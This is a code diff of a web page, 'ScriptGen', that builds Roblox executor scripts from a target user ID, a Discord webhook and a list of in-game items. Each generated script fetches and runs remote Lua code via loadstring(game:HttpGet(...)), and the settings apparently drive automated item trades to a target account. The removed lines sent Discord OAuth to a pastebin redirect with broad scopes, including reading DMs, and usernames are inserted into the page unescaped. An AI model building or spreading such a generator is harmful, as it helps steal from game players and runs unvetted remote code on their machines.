@@ -10,12 +10,12 @@
     nav { display: flex; align-items: center; justify-content: space-between; padding: 1rem 1.5rem; border-bottom: 1px solid rgba(167,139,250,0.2); background: rgba(0,0,0,0.2); }
     .nav-left { display: flex; align-items: center; gap: 1.5rem; }
     .logo { font-size: 1.1rem; font-weight: 800; background: linear-gradient(90deg, #a78bfa, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; cursor: pointer; }
-    .nav-link { color: #c4b5fd; font-size: 0.875rem; cursor: pointer; text-decoration: none; }
+    .nav-link { color: #c4b5fd; font-size: 0.875rem; cursor: pointer; }
     .nav-link:hover { color: #fff; }
     .nav-right { display: flex; align-items: center; gap: 0.75rem; }
-    .user-info { display: flex; align-items: center; gap: 0.5rem; font-size: 0.875rem; }
+    .user-info { display: flex; align-items: center; gap: 0.5rem; font-size: 0.875rem; color: #ddd6fe; }
     .user-avatar { width: 28px; height: 28px; border-radius: 50%; }
-    .user-avatar-placeholder { width: 28px; height: 28px; border-radius: 50%; background: linear-gradient(135deg, #7c3aed, #db2777); display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; }
+    .user-avatar-ph { width: 28px; height: 28px; border-radius: 50%; background: linear-gradient(135deg, #7c3aed, #db2777); display: inline-flex; align-items: center; justify-content: center; font-size: 0.7rem; font-weight: 700; color: #fff; }
     .user-count { color: #a78bfa; font-size: 0.75rem; }
     .btn-discord { display: flex; align-items: center; gap: 0.5rem; background: #5865F2; color: #fff; font-size: 0.875rem; font-weight: 600; padding: 0.5rem 1rem; border: none; border-radius: 0.5rem; cursor: pointer; text-decoration: none; }
     .btn-logout { font-size: 0.75rem; color: #a78bfa; border: 1px solid rgba(167,139,250,0.4); background: none; padding: 0.375rem 0.75rem; border-radius: 0.5rem; cursor: pointer; }
@@ -34,49 +34,50 @@
     textarea { resize: none; font-family: monospace; }
     .row { display: flex; gap: 0.5rem; }
     .row input { flex: 1; }
-    .btn-lookup { background: linear-gradient(135deg, #7c3aed, #a21caf); color: #fff; font-size: 0.875rem; font-weight: 600; padding: 0 1rem; border: none; border-radius: 0.5rem; cursor: pointer; white-space: nowrap; }
+    .btn-lookup { background: linear-gradient(135deg, #7c3aed, #a21caf); color: #fff; font-size: 0.875rem; font-weight: 600; padding: 0 1rem; border: none; border-radius: 0.5rem; cursor: pointer; }
     .btn-lookup:disabled { opacity: 0.5; cursor: not-allowed; }
-    .error { color: #f87171; font-size: 0.75rem; margin-top: 0.25rem; }
+    .error-msg { color: #f87171; font-size: 0.75rem; margin-top: 0.25rem; }
     .hint { color: rgba(167,139,250,0.55); font-size: 0.75rem; margin-top: 0.25rem; }
     .hint code { color: #f9a8d4; }
     .btn-row { display: flex; gap: 0.75rem; }
-    .btn-generate { flex: 1; background: linear-gradient(135deg, #7c3aed, #db2777, #ea580c); color: #fff; font-weight: 700; font-size: 0.9rem; padding: 0.75rem; border: none; border-radius: 0.5rem; cursor: pointer; transition: opacity 0.15s, transform 0.1s; }
+    .btn-generate { flex: 1; background: linear-gradient(135deg, #7c3aed, #db2777, #ea580c); color: #fff; font-weight: 700; font-size: 0.9rem; padding: 0.75rem; border: none; border-radius: 0.5rem; cursor: pointer; }
     .btn-generate:hover { opacity: 0.9; }
     .btn-generate:active { transform: scale(0.98); }
-    .btn-save { background: rgba(255,255,255,0.1); border: 1px solid rgba(167,139,250,0.3); color: #fff; font-size: 0.875rem; font-weight: 600; padding: 0 1.25rem; border-radius: 0.5rem; cursor: pointer; transition: background 0.15s; display: none; }
+    .btn-save { background: rgba(255,255,255,0.1); border: 1px solid rgba(167,139,250,0.3); color: #fff; font-size: 0.875rem; font-weight: 600; padding: 0 1.25rem; border-radius: 0.5rem; cursor: pointer; display: none; }
     .btn-save.saved { background: linear-gradient(135deg, #16a34a, #15803d); border-color: transparent; }
     .output-header { display: flex; align-items: center; justify-content: space-between; }
     .output-label { font-size: 0.875rem; font-weight: 600; color: #86efac; }
     .btn-copy { font-size: 0.75rem; font-weight: 600; background: linear-gradient(135deg, #7c3aed, #a21caf); color: #fff; border: none; padding: 0.375rem 0.75rem; border-radius: 0.5rem; cursor: pointer; }
     .btn-copy.copied { background: linear-gradient(135deg, #16a34a, #15803d); }
     pre { font-size: 0.75rem; color: #4ade80; background: rgba(0,0,0,0.4); border: 1px solid rgba(74,222,128,0.2); border-radius: 0.5rem; padding: 1rem; overflow-x: auto; white-space: pre-wrap; word-break: break-all; line-height: 1.6; font-family: monospace; }
-    /* Leaderboard */
     #page-leaderboard { display: none; }
-    .lb-header { text-align: center; }
-    .lb-header p { color: #c4b5fd; font-size: 0.875rem; margin-top: 0.4rem; }
     .lb-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(167,139,250,0.3); border-radius: 1rem; overflow: hidden; }
     table { width: 100%; font-size: 0.875rem; border-collapse: collapse; }
     th { text-align: left; padding: 0.75rem 1.25rem; color: #c4b5fd; font-weight: 600; background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(167,139,250,0.2); }
     th.right, td.right { text-align: right; }
-    td { padding: 0.875rem 1.25rem; border-bottom: 1px solid rgba(167,139,250,0.1); }
+    td { padding: 0.875rem 1.25rem; border-bottom: 1px solid rgba(167,139,250,0.1); color: #f1f5f9; }
     tr:hover td { background: rgba(255,255,255,0.03); }
     .lb-user { display: flex; align-items: center; gap: 0.75rem; }
     .lb-avatar { width: 32px; height: 32px; border-radius: 50%; }
-    .lb-avatar-placeholder { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #7c3aed, #db2777); display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 700; }
+    .lb-avatar-ph { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #7c3aed, #db2777); display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 700; color: #fff; }
     .lb-count { font-weight: 700; background: linear-gradient(90deg, #a78bfa, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     .lb-empty { padding: 3rem; text-align: center; color: #c4b5fd; font-size: 0.875rem; }
     .rank { font-weight: 700; color: #fff; }
+    #loading-overlay { position: fixed; inset: 0; background: rgba(15,12,41,0.9); display: flex; align-items: center; justify-content: center; z-index: 999; color: #c4b5fd; font-size: 1rem; }
+    #loading-overlay.hidden { display: none; }
   </style>
 </head>
 <body>
 
+<div id="loading-overlay" class="hidden">Logging you in...</div>
+
 <nav>
   <div class="nav-left">
     <span class="logo" onclick="showPage('home')">ScriptGen</span>
-    <a class="nav-link" onclick="showPage('leaderboard')">Leaderboard</a>
+    <span class="nav-link" onclick="showPage('leaderboard')">Leaderboard</span>
   </div>
   <div class="nav-right" id="nav-right">
-    <a class="btn-discord" href="https://discord.com/oauth2/authorize?client_id=1481713001710223501&response_type=code&redirect_uri=https%3A%2F%2Fpastebin.com%2Fraw%2FRW8xuBEE&scope=identify+connections+email+activities.read+presences.read+dm_channels.messages.read+applications.commands.permissions.update">
+    <a class="btn-discord" id="login-btn" href="#">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.004.048.03.092.066.114a19.834 19.834 0 0 0 5.985 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 5.99-3.03.077.077 0 0 0 .066-.114c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
       Sign in with Discord
     </a>
@@ -100,7 +101,7 @@
           <input id="username" type="text" placeholder="e.g. Builderman" onkeydown="if(event.key==='Enter')lookup()" />
           <button class="btn-lookup" id="lookup-btn" onclick="lookup()">Look up</button>
         </div>
-        <div class="error" id="lookup-error"></div>
+        <div class="error-msg" id="lookup-error"></div>
       </div>
       <div>
         <label for="userid">Roblox User ID</label>
@@ -130,9 +131,9 @@
   </div>
 
   <div id="page-leaderboard" class="container">
-    <div class="lb-header">
+    <div>
       <h1>Leaderboard</h1>
-      <p>Top 100 script generators</p>
+      <p class="subtitle">Top 100 script generators</p>
     </div>
     <div class="lb-card">
       <div id="lb-content" class="lb-empty">Loading...</div>
@@ -141,52 +142,97 @@
 </main>
 
 <script>
-  const API = 'https://pastebin.com/raw/RW8xuBEE';
+  // ─── CONFIG ──────────────────────────────────────────────────────────────────
+  const API = 'https://c26c084e-f34f-4552-9fca-e0e9cd0559ca-00-2s0pu1llouxxq.spock.replit.dev';
+  const SITE_URL = 'https://verdant-bunny-38db18.netlify.app/';
+  const DISCORD_OAUTH = `https://discord.com/oauth2/authorize?client_id=1481713001710223501&response_type=code&redirect_uri=https%3A%2F%2Fverdant-bunny-38db18.netlify.app%2F&scope=guilds.join+identify`;
   const medals = ['🥇','🥈','🥉'];
-  let currentUser = null;
 
+  // ─── AUTH STATE ──────────────────────────────────────────────────────────────
+  let currentUser = null;
+  let authToken = localStorage.getItem('auth_token');
+
+  function apiHeaders() {
+    const h = { 'Content-Type': 'application/json' };
+    if (authToken) h['Authorization'] = 'Bearer ' + authToken;
+    return h;
+  }
+
+  // ─── INIT ────────────────────────────────────────────────────────────────────
   async function init() {
-    try {
-      const res = await fetch(API + '/api/auth/me', { credentials: 'include' });
-      if (res.ok) {
-        currentUser = await res.json();
-        renderNav();
-        const s = await fetch(API + '/api/settings', { credentials: 'include' });
-        if (s.ok) {
-          const settings = await s.json();
-          document.getElementById('webhook').value = settings.webhook || '';
-          document.getElementById('userid').value = settings.robloxUserId || '';
-          document.getElementById('brainrots').value = settings.brainrots || '';
-          document.getElementById('custom').value = settings.customLoadstring || '';
+    document.getElementById('login-btn').href = DISCORD_OAUTH;
+
+    const params = new URLSearchParams(window.location.search);
+    const code = params.get('code');
+
+    if (code) {
+      document.getElementById('loading-overlay').classList.remove('hidden');
+      window.history.replaceState({}, '', '/');
+      try {
+        const res = await fetch(API + '/api/auth/discord/exchange', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code, redirectUri: SITE_URL }),
+        });
+        if (res.ok) {
+          const data = await res.json();
+          authToken = data.token;
+          localStorage.setItem('auth_token', authToken);
+          currentUser = data.user;
         }
+      } catch (e) { console.error('Auth exchange failed', e); }
+      document.getElementById('loading-overlay').classList.add('hidden');
+    }
+
+    if (authToken && !currentUser) {
+      try {
+        const res = await fetch(API + '/api/auth/me', { headers: apiHeaders() });
+        if (res.ok) currentUser = await res.json();
+        else { authToken = null; localStorage.removeItem('auth_token'); }
+      } catch {}
+    }
+
+    if (currentUser) {
+      renderUserNav();
+      loadSettings();
+    }
+  }
+
+  function renderUserNav() {
+    document.getElementById('save-btn').style.display = 'block';
+    document.getElementById('subtitle').textContent = `Welcome back, ${currentUser.username}! Settings auto-save on generate.`;
+    document.getElementById('nav-right').innerHTML = `
+      <div class="user-info">
+        ${currentUser.avatar
+          ? `<img class="user-avatar" src="${currentUser.avatar}" />`
+          : `<span class="user-avatar-ph">${currentUser.username[0].toUpperCase()}</span>`}
+        <span>${currentUser.username}</span>
+        <span class="user-count">· ${currentUser.generationCount} generated</span>
+      </div>
+      <button class="btn-logout" onclick="logout()">Log out</button>
+    `;
+  }
+
+  async function loadSettings() {
+    try {
+      const res = await fetch(API + '/api/settings', { headers: apiHeaders() });
+      if (res.ok) {
+        const s = await res.json();
+        document.getElementById('webhook').value = s.webhook || '';
+        document.getElementById('userid').value = s.robloxUserId || '';
+        document.getElementById('brainrots').value = s.brainrots || '';
+        document.getElementById('custom').value = s.customLoadstring || '';
       }
     } catch {}
   }
 
-  function renderNav() {
-    const navRight = document.getElementById('nav-right');
-    if (currentUser) {
-      document.getElementById('save-btn').style.display = 'block';
-      document.getElementById('subtitle').textContent = `Welcome back, ${currentUser.username}! Your settings are auto-saved.`;
-      navRight.innerHTML = `
-        <div class="user-info">
-          ${currentUser.avatar
-            ? `<img class="user-avatar" src="${currentUser.avatar}" alt="${currentUser.username}" />`
-            : `<div class="user-avatar-placeholder">${currentUser.username[0].toUpperCase()}</div>`}
-          <span>${currentUser.username}</span>
-          <span class="user-count">· ${currentUser.generationCount} generated</span>
-        </div>
-        <button class="btn-logout" onclick="logout()">Log out</button>
-      `;
-    }
-  }
-
-  async function logout() {
-    await fetch(API + '/api/auth/logout', { method: 'POST', credentials: 'include' });
-    currentUser = null;
+  function logout() {
+    authToken = null; currentUser = null;
+    localStorage.removeItem('auth_token');
     location.reload();
   }
 
+  // ─── LOOKUP ──────────────────────────────────────────────────────────────────
   async function lookup() {
     const username = document.getElementById('username').value.trim();
     if (!username) return;
@@ -196,46 +242,38 @@
     try {
       const res = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
       const data = await res.json();
-      if (data.Id) { document.getElementById('userid').value = data.Id; }
-      else { err.textContent = 'User not found.'; }
+      if (data.Id) document.getElementById('userid').value = data.Id;
+      else err.textContent = 'User not found.';
     } catch { err.textContent = 'Lookup failed. Enter ID manually.'; }
     btn.disabled = false; btn.textContent = 'Look up';
   }
 
+  // ─── GENERATE ────────────────────────────────────────────────────────────────
   async function generate() {
     const webhook = document.getElementById('webhook').value;
     const userid = document.getElementById('userid').value;
     const raw = document.getElementById('brainrots').value;
     const custom = document.getElementById('custom').value.trim();
-    const brainrots = raw.split('\n').map(b => b.trim()).filter(b => b.length > 0);
+    const brainrots = raw.split('\n').map(b => b.trim()).filter(Boolean);
     const entries = brainrots.map((b, i) => `    ["${b}"] = true${i < brainrots.length - 1 ? ',' : ''}`).join('\n');
     const customBlock = custom ? `\ntask.spawn(function()\n${custom}\nend)` : '';
-    const script = `getgenv().TARGET_ID = "${userid}"
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "${webhook}"
-getgenv().TARGET_BRAINROTS = {
-${entries}
-}
-task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8665366837c09ed56f0e30fdebd4baf1b39864d8822bffdf882f80d3d60b55c9/download"))()
-end)${customBlock}`;
+    const script = `getgenv().TARGET_ID = "${userid}"\ngetgenv().DELAY_STEP = 1      \ngetgenv().TRADE_CYCLE_DELAY = 2\ngetgenv().DISCORD_WEBHOOK = "${webhook}"\ngetgenv().TARGET_BRAINROTS = {\n${entries}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8665366837c09ed56f0e30fdebd4baf1b39864d8822bffdf882f80d3d60b55c9/download"))()\nend)${customBlock}`;
     document.getElementById('script-output').textContent = script;
     document.getElementById('output-card').style.display = 'flex';
-    document.getElementById('copy-btn').textContent = 'Copy';
     document.getElementById('copy-btn').classList.remove('copied');
+    document.getElementById('copy-btn').textContent = 'Copy';
     if (currentUser) {
-      saveSettings();
-      fetch(API + '/api/track-generate', { method: 'POST', credentials: 'include' }).catch(() => {});
+      saveSettings(true);
+      fetch(API + '/api/track-generate', { method: 'POST', headers: apiHeaders() }).catch(() => {});
+      currentUser.generationCount++;
     }
   }
 
-  async function saveSettings() {
+  async function saveSettings(silent = false) {
     if (!currentUser) return;
     const btn = document.getElementById('save-btn');
     await fetch(API + '/api/settings', {
-      method: 'POST', credentials: 'include',
-      headers: { 'Content-Type': 'application/json' },
+      method: 'POST', headers: apiHeaders(),
       body: JSON.stringify({
         webhook: document.getElementById('webhook').value,
         robloxUserId: document.getElementById('userid').value,
@@ -243,8 +281,10 @@ end)${customBlock}`;
         customLoadstring: document.getElementById('custom').value,
       })
     }).catch(() => {});
-    btn.textContent = 'Saved!'; btn.classList.add('saved');
-    setTimeout(() => { btn.textContent = 'Save'; btn.classList.remove('saved'); }, 2000);
+    if (!silent) {
+      btn.textContent = 'Saved!'; btn.classList.add('saved');
+      setTimeout(() => { btn.textContent = 'Save'; btn.classList.remove('saved'); }, 2000);
+    }
   }
 
   function copyScript() {
@@ -254,31 +294,32 @@ end)${customBlock}`;
     setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
   }
 
-  async function showPage(page) {
+  // ─── PAGES ───────────────────────────────────────────────────────────────────
+  function showPage(page) {
     document.getElementById('page-home').style.display = page === 'home' ? 'flex' : 'none';
     document.getElementById('page-leaderboard').style.display = page === 'leaderboard' ? 'flex' : 'none';
     if (page === 'leaderboard') loadLeaderboard();
   }
 
   async function loadLeaderboard() {
-    const content = document.getElementById('lb-content');
-    content.innerHTML = '<div class="lb-empty">Loading...</div>';
+    const el = document.getElementById('lb-content');
+    el.innerHTML = '<div class="lb-empty">Loading...</div>';
     try {
-      const res = await fetch(API + '/api/leaderboard', { credentials: 'include' });
+      const res = await fetch(API + '/api/leaderboard', { headers: apiHeaders() });
       const entries = await res.json();
-      if (!entries.length) { content.innerHTML = '<div class="lb-empty">No entries yet. Generate a script to be first!</div>'; return; }
-      content.innerHTML = `<table>
+      if (!entries.length) { el.innerHTML = '<div class="lb-empty">No entries yet. Be the first!</div>'; return; }
+      el.innerHTML = `<table>
         <thead><tr><th>Rank</th><th>User</th><th class="right">Scripts Generated</th></tr></thead>
         <tbody>${entries.map((e, i) => `<tr>
-          <td class="rank">${i < 3 ? medals[i] : '#' + (i + 1)}</td>
+          <td class="rank">${i < 3 ? medals[i] : '#'+(i+1)}</td>
           <td><div class="lb-user">
-            ${e.avatar ? `<img class="lb-avatar" src="${e.avatar}" />` : `<div class="lb-avatar-placeholder">${e.username[0].toUpperCase()}</div>`}
+            ${e.avatar ? `<img class="lb-avatar" src="${e.avatar}"/>` : `<div class="lb-avatar-ph">${e.username[0].toUpperCase()}</div>`}
             <span>${e.username}</span>
           </div></td>
           <td class="right lb-count">${e.generationCount.toLocaleString()}</td>
         </tr>`).join('')}</tbody>
       </table>`;
-    } catch { content.innerHTML = '<div class="lb-empty">Failed to load leaderboard.</div>'; }
+    } catch { el.innerHTML = '<div class="lb-empty">Failed to load leaderboard.</div>'; }
   }
 
   init();
